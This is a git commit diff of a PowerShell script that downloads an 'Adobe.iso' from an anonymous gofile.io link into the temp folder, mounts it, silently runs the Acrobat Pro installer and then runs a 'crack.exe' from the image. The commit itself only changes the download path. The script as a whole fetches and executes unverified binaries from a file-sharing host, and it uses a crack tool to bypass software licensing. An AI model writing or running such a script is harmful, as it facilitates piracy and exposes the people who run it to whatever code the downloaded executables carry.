034bc76344faad922230e8e48fc3fc8a3486ef1f
Zigsaw07 <167530015+Zigsaw07@users.noreply.github.com>
2024-07-05 19:20:03 +0530

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,15 +1,15 @@
-# Define the URL and file path
+# Define the URL and temp file path
 $url = "https://store4.gofile.io/download/web/0c13270e-b6bf-414b-8096-6f4f7b0f4da7/Adobe.iso"
-$filePath = "C:\Path\To\Download\Adobe.iso"
+$tempFilePath = [System.IO.Path]::Combine($env:TEMP, "Adobe.iso")
 
-# Download the ISO file
-Invoke-WebRequest -Uri $url -OutFile $filePath
+# Download the ISO file to the temp folder
+Invoke-WebRequest -Uri $url -OutFile $tempFilePath
 
 # Mount the ISO file
-Mount-DiskImage -ImagePath $filePath
+Mount-DiskImage -ImagePath $tempFilePath
 
 # Get the drive letter of the mounted ISO
-$driveLetter = (Get-DiskImage -ImagePath $filePath | Get-Volume).DriveLetter
+$driveLetter = (Get-DiskImage -ImagePath $tempFilePath | Get-Volume).DriveLetter
 
 # Run the setup silently
 Start-Process -FilePath "$($driveLetter):\Adobe Acrobat Pro\Setup.exe" -ArgumentList "/s" -Wait
@@ -18,7 +18,7 @@ Start-Process -FilePath "$($driveLetter):\Adobe Acrobat Pro\Setup.exe" -Argument
 Start-Process -FilePath "$($driveLetter):\Adobe Acrobat Pro\crack.exe" -Wait
 
 # Dismount the ISO file
-Dismount-DiskImage -ImagePath $filePath
+Dismount-DiskImage -ImagePath $tempFilePath
 
 # Optionally, remove the ISO file after installation
-Remove-Item -Path $filePath
+Remove-Item -Path $tempFilePath
